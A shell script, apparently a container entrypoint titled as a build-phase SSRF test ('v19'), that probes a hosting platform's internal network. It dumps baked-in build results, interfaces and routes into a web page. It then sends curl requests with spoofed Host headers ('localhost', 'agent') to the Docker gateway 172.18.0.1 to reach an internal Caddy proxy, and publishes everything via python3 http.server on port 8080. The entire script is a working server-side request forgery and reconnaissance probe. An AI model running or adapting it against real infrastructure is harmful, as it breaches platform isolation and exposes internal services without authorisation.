#!/bin/sh
echo "=== v19: build.network:host — build-phase SSRF ===" > /app/index.html
echo "Time: $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> /app/index.html

echo "" >> /app/index.html
echo "=== BUILD-PHASE RESULTS (baked into image) ===" >> /app/index.html
cat /build-results.txt >> /app/index.html 2>&1

echo "" >> /app/index.html
echo "=== RUNTIME INTERFACES ===" >> /app/index.html
ip -4 addr show >> /app/index.html 2>&1

echo "" >> /app/index.html
echo "=== RUNTIME ROUTES ===" >> /app/index.html
ip route show >> /app/index.html 2>&1

echo "" >> /app/index.html
echo "=== RUNTIME: Caddy Host header probes ===" >> /app/index.html
echo "--- Host: localhost ---" >> /app/index.html
curl -sv -m 3 -H "Host: localhost" http://172.18.0.1:80/ >> /app/index.html 2>&1
echo "" >> /app/index.html
echo "--- Host: 172.18.0.2 ---" >> /app/index.html
curl -sv -m 3 -H "Host: 172.18.0.2" http://172.18.0.1:80/ >> /app/index.html 2>&1
echo "" >> /app/index.html
echo "--- Host: agent ---" >> /app/index.html
curl -sv -m 3 -H "Host: agent" http://172.18.0.1:80/ >> /app/index.html 2>&1

echo "" >> /app/index.html
echo "=== done $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" >> /app/index.html

cd /app && python3 -m http.server 8080
